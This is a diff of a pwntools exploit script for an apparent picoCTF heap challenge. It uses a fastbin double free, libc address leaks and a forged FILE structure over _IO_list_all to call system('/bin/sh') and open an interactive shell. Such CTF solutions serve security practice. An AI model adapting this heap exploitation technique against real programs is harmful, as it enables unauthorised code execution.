@@ -4,12 +4,12 @@ HOST, PORT = '0.0.0.0', 31337
 # HOST, PORT = 'fickle-tempest.picoctf.net', 54316
 r = remote(HOST, PORT)
 
-def add_chunk(size, data):
+def add(size, data):
     r.sendlineafter('> ', '1')
     r.sendlineafter('> ', f'{size}')
     r.sendlineafter('> ', data)
 
-def free_chunk(idx):
+def free(idx):
     r.sendlineafter('> ', '2')
     r.sendlineafter('> ', str(idx))
 
@@ -20,49 +20,47 @@ def reintroduce(data):
     r.sendlineafter('> ', '3')
     r.sendlineafter('> ', data)
 
+introduce(b'test')
+RETME = 0x602130
+SMALLBIN = 0x602050
 
-data = 0x602040
-print_flag = 0x400cc4
+add(50, b'')
+reintroduce(b'A' * (0x100-1))
+r.recvuntil(b'A\n')
+heap_leak = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
+heap_base = heap_leak - 0x10
 
-introduce(flat([
-    p64(0), p64(0x61), p64(0)
-]))
-add_chunk(0x58, b'A')
-add_chunk(0x58, b'B')
-free_chunk(0)
-free_chunk(1)
-free_chunk(0)
-add_chunk(0x58, p64(data))
-add_chunk(0x58, b'C' * 0x57)
-add_chunk(0x58, b'D' * 0x57)
-add_chunk(0x58, b'E' * 0x57)
-fake_chunk = p64(0) + p64(0x91) + p64(0x21) * 23
-reintroduce(fake_chunk)
-free_chunk(5)
-reintroduce(b'A' * 0x15 + b' \n')
-r.recvuntil(b'\n\n')
-libc_main_arena_88 = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
-libc = libc_main_arena_88 - 88 - 0x3c4b20
-libc_freehook = libc + 0x3c67a8
-libc_io_list_all = libc + 0x3c5520
-pop_rdi = libc + 0x400d83
-reintroduce(flat([
-    p64(0), p64(0x61), p64(libc_main_arena_88), p64(libc_io_list_all-0x10)
-]))
-add_chunk(0x58, '')
-payload = p64(0)
-payload += p64(0x61)
-fake_file = b'flag.txt\x00'
-fake_file = fake_file.ljust(0x20, b'\x00')
-fake_file += p64(0)
-fake_file += p64(1)
-fake_file = fake_file.ljust(0xc0, b'\x00')
-fake_file += p64(0)
-fake_file = fake_file.ljust(0xd8, b'\x00')
-fake_file += p64(data + 0x10 + 0xd8)
-fake_vtable = p64(0) * 3
-fake_vtable += p64(print_flag)
-payload += fake_file + fake_vtable
-print(hex(len(payload)))
+payload = p64(0) + p64(0xc1) + p64(0) * 22 + p64(0xc1) + p64(0x31) + p64(0) * 5 + p64(0x41)
+print(len(payload))
+reintroduce(payload[:-1])
+
+add(50, b'')
+add(50, b'')
+free(0)
+free(1)
+free(0)
+add(50, p64(RETME))
+add(50, b'')
+add(50, b'')
+add(50, p64(SMALLBIN))
+free(0)
+
+reintroduce(b'A' * 15)
+r.recvuntil(b'A\n')
+main_arena_88 = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
+libc_base = main_arena_88 - 0x3c4b78
+IO_list_all = libc_base + 0x3c5520
+system = libc_base + 0x45390
+
+payload = b'/bin/sh\x00' + p64(0x61)
+payload += p64(0xdeadbeef) + p64(IO_list_all-0x10)
+payload += p64(2) + p64(3)
+payload += p64(system)*18
+payload += p64(0) + p64(0)
+payload += p64(0) + p64(0x602040+0x60)
+
 reintroduce(payload)
+
+r.sendlineafter(b'> ', b'1')
+r.sendlineafter(b'> ', b'40')
 r.interactive()
